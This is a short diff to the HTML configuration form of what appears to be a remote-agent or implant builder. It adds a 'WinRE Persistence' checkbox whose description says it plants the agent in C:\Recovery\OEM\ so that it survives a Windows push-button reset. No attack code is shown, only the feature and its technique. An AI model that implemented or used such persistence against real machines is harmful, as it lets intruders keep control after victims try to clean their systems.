@@ -501,6 +501,16 @@
                     </label>
 
                     <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-amber-500 transition-colors">
+                      <input type="checkbox" name="enable-winre" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-shield-halved text-amber-400"></i> WinRE Persistence
+                        </span>
+                        <span class="text-xs text-slate-500">Compile WinRE persistence support into the agent (Windows only). Allows planting the agent into <code>C:\Recovery\OEM\</code> to survive a Windows push reset. Not included in macOS/Linux builds regardless of this setting.</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-amber-500 transition-colors">
                       <input type="checkbox" name="fetch-public-ip" class="w-4 h-4" />
                       <div class="flex flex-col">
                         <span class="flex items-center gap-2">
